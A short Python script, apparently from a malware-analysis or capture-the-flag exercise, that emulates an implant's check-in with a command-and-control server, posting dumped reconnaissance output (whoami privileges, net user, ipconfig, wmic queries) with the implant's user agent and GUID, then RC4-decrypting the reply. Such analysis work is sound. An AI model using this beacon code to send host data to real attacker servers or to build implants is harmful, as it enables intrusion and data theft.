import requests
import sys
import time
from rc4_decr import reverse_rc4, format_as_byte_string
from typing import Tuple

log = open('c2_conn.log', 'w')

SERVER = "exam.gradescopech0nky.com"
PORT = 443
USER_AGENT = "1337ch0nky"
GUID = "4F8E09B3-8C22-4C4B-9FC7-2ABD2B10144A"
CHECKIN = '/checkin.php'
NO_ARGS = 'no args'

def c2_connect(c2_post_file: str, c2_post_data_str: str):
    headers = {
        "User-Agent": USER_AGENT,
        "Authorization": GUID,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    url = f"https://{SERVER}:{PORT}{c2_post_file}"
    response = requests.post(url, headers=headers, data=c2_post_data_str)

    if response.status_code == 200:
        log.write(response.text)
        return response.text
    else:
        print(f"[!] request failed with status code {response.status_code}")
        log.close()
        quit()
        
whoami_priv = ''
with open('exe_command_dumps/whoami_priv_dump.txt', 'r') as f:
    whoami_priv = ''.join(f.readlines())

net_user = ''
with open('exe_command_dumps/net_usr_dump.txt', 'r') as f:
    net_user = ''.join(f.readlines())

ipconfig_all = ''
with open('exe_command_dumps/ipconfig_all_dump.txt', 'r') as f:
    ipconfig_all = ''.join(f.readlines())
    
wmic_ns = ''
with open('exe_command_dumps/wmic_namespace_dump.txt', 'r') as f:
    wmic_ns = ''.join(f.readlines())

wmic_cs = ''
with open('exe_command_dumps/wmic_compsys_dump.txt', 'r') as f:
    wmic_cs = ''.join(f.readlines())
    
resp = c2_connect(CHECKIN, wmic_ns)
print(reverse_rc4(format_as_byte_string(resp)))